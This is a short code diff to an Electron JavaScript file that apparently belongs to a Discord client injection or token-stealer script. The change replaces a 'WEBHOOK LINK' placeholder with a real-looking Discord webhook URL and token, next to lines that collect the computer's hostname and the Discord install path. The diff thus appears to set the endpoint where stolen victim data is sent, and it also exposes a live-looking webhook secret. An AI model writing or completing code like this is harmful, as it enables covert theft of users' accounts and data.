@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "WEBHOOK LINK";
+var webhook = "https://discord.com/api/webhooks/933133642220322868/_8fe5rRnJiuq1ozypYzxnVAe1MVFj2E94975Vz-G4I3Eh-ZiZ8eHEZyvfDGaKbT9Y93K";
 var delayInMilliseconds = 1000
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
